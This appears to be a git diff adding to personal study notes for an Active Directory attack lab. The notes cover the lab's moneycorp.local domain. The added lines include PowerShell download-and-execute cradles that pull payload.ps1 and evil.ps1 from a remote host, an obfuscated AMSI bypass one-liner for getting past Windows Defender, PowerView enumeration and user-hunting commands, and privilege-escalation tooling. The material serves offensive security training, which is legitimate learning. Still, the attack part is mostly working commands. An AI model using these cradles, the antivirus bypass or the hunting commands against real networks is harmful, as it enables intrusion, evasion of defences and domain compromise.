@@ -7,7 +7,236 @@ powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
 Import-Module 
 Get-Command -Module 
 
-![](20220801163041.png) 
+```powershell
+iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+$ie=New-Object -ComObject
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1
+');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')
+$h=New-Object -ComObject
+Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
+$h.responseText
+$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
+# Domain enumeration 
+
+```powershell
+PS C:\Windows\system32> $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]
+
+PS C:\Windows\system32> $ADClass::GetCurrentDomain()
+
+
+Forest                  : moneycorp.local
+DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
+Children                : {us.dollarcorp.moneycorp.local}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : moneycorp.local
+PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
+InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
+Name                    : dollarcorp.moneycorp.local
+
+```
+
+We can also use 
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1  - for domain enumeration
+
+https://github.com/samratashok/ADModule - THis is the Active Directory Module of powershell
+
+### commands for domain enumeration
+
+trying to import powerview
+
+```
+PS C:\Windows\system32> Import-Module C:\AD\Tools\PowerView.ps1
+At C:\AD\Tools\PowerView.ps1:1 char:1
++ #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+```
+
+not able to run any script with windows defender in place
+
+we need to do amsi bypass
+
+```powershell
+S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+>Get-NetDomain
+Get-NetDomain -Domain moneycorp.local
+Get-DOmainSID
+
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"
+(Get-DomainPolicy -domain moneycorp/local)."system access"
+
+>Get-NetDomainController
+Get-NetDomainCOntroller -Domain moneycorp.local
+
+>Get-NetUser 					
+Get-NetUser -Username student1
+
+Get-UserProperty
+Get-UserProperty -Properties pwdlastset
+
+Find-UserField -SearchField Description -SearchTerm "built"
+
+>Get-NetComputer
+>Get-NetGroup
+Get-NetGroup -Domain <targetdomain>
+
+>Get-NetGroup *admin*
+Get-NetGroupMember -GroupName "Domain Admins" -Recurse
+Get-NetGroup -UserName "student1"
+
+List all the local groups on a machine (needs administrator privs on non-
+dc machines) :
+Get-NetLocalGroup -ComputerName dcorp-
+dc.dollarcorp.moneycorp.local -ListGroups
+• Get members of all the local groups on a machine (needs administrator
+privs on non-dc machines)
+Get-NetLocalGroup -ComputerName dcorp-
+dc.dollarcorp.moneycorp.local -Recurse
+
+Get-NetLoggedon –ComputerName <servername>
+
+Get locally logged users on a computer (needs remote registry on the
+target - started by-default on server OS)
+Get-LoggedonLocal -ComputerName dcorp-
+dc.dollarcorp.moneycorp.local
+• Get the last logged user on a computer (needs administrative rights and
+remote registry on the target)
+Get-LastLoggedOn –ComputerName <servername>
+
+>Invoke-ShareFinder -Verbose
+>Invoke-FileFinder -Verbose
+>Get-NetFileServer
+
+# looking at GPO
+
+>Get-NetGPO
+Get-NetGPO -ComputerName dcorp-
+student1.dollarcorp.moneycorp.local
+>Get-NetGPOGroup
+Find-GPOComputerAdmin –Computername dcorp- student1.dollarcorp.moneycorp.local
+Find-GPOLocation -UserName student1 -Verbose
+
+# looking at OU
+
+Get-NetOU -FullData
+Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}
+
+# looking at acl
+
+DACL – Defines the permissions trustees (a user or group) have on an object.
+SACL – Logs success and failure audit messages when an object is accessed
+
+Get-ObjectAcl -SamAccountName student1 –ResolveGUID
+Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
+
+Get-ObjectAcl -ADSpath "LDAP://CN=Domain
+Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -
+Verbose
+
+>Invoke-ACLScanner -ResolveGUIDs
+>Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+
+# looking at trust
+
+Get-NetDomainTrust
+Get-NetDomainTrust –Domain us.dollarcorp.moneycorp.local
+
+cobalt strike we shouldnnt buy licensed veresdiob
+however almost all unlicensed versions can be backdoored
+
+# forest mapping
+
+Get-NetForest
+Get-NetForestDomain
+
+Get-NetForestCatalog
+Get-NetForestCatalog –Forest eurocorp.local
+Get-NetForestTrust
+Get-NetForestTrust –Forest eurocorp.local
+
+# User hunting
+
+>Find-LocalAdminAccess –Verbose
+Find all machines on the current domain where the current user has
+local admin access
+
+>Invoke-CheckLocalAdminAccess after running Get-NetComputer
+
+Find-WMILocalAdminAccess.ps1
+
+>Invoke-EnumerateLocalAdmin –Verbose
+
+This function queries the DC of the current or provided domain for a list
+of computers (Get-NetComputer) and then use multi-threaded Get-
+NetLocalGroup on each machine.
+
+>invoke-UserHunter
+Invoke-UserHunter -GroupName "RDPUsers"
+Get-NetGroupMember
+Invoke-UserHunter -CheckAccess
+
+Invoke-UserHunter -Stealth
+
+# Defense
+.\NetCease.ps1
+
+# local privilege escalation
+here are various ways of locally escalating privileges on Windows box:
+– Missing patches
+– Automated deployment and AutoLogon passwords in clear text
+– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
+– Misconfigured Services
+– DLL Hijacking and more
+• We can use below tools for complete coverage
+– PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+– BeRoot: https://github.com/AlessandroZ/BeRoot
+– Privesc: https://github.com/enjoiz/Privesc
+
+# service issue powerup
+
+Get-ServiceUnquoted -verbose
+Get-Modifiableservicefile -verbose
+Get-ModifiableService -verbose
+
+from powerup
+Invoke-AllChecks
+
+BeRoot executable
+
+privesc
+Invoke-PrivEsc
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 # kerberoasting
 
